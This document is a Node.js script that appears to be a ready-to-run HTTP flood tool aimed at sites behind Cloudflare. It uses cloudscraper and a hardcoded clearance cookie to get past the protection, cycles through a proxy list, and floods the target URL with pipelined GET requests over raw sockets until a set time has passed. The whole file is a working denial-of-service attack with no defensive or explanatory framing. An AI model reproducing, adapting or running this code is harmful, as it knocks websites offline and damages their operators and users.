const fs = require('fs');
const url = require('url');
const net = require('net');
var cloudscraper = require('cloudscraper');
var target = process.argv[2];
const proxies = fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
var theproxy = 0;
var cookie = "";
var ua = "";
var time = process.argv[4];
var host = url.parse(target).host;
var parsed = url.parse(target);
var proxy = proxies[theproxy];
process.on('uncaughtException', function (e) {});
console.log(time);
process.on('unhandledRejection', function (e) {});
cloudscraper.get(target, function (error, response) {
	if (error) {} else {
		var parsed = JSON.parse(JSON.stringify(response));
		cookie = (parsed["request"]["headers"]["cookie"]);
		if (cookie == undefined) {
			cookie = (parsed["headers"]["set-cookie"]);
		}
		ua = (parsed["request"]["headers"]["User-Agent"]);
	}
	console.log('Received tokens!')
	console.log(cookie + '/' + ua);
});
cookie = "__cfduid=d92e8110efc52a54b1c5dcf2a0054a91f1562859160; cf_clearance=e16aedb8582dcd34f7ada5309c441018f0e3dab6-1562859166-900-250";
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0";
var int = setInterval(() => {
	if (cookie !== '' && ua !== '') {
		theproxy++;
		if (theproxy == proxies.length - 1) {
			theproxy = 0;
		}
		proxy = proxies[theproxy];
		if (proxy && proxy.length > 5) {
			proxy = proxy.split(':');
		} else {
			return false;
		}
		var s = new net.Socket();
		s.setTimeout(10000);
		s.connect(proxy[1], proxy[0], function () {
			for (var i = 0; i < 50; i++) {
				s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
			}
		});

		s.on('data', function () {
			setTimeout(function () {
				s.destroy();
				return delete s;
			}, 5000);
		})
	}
});
setTimeout(() => clearInterval(int), time * 1000);
setTimeout((function () {
	return process.exit(0);
}), time * 1000);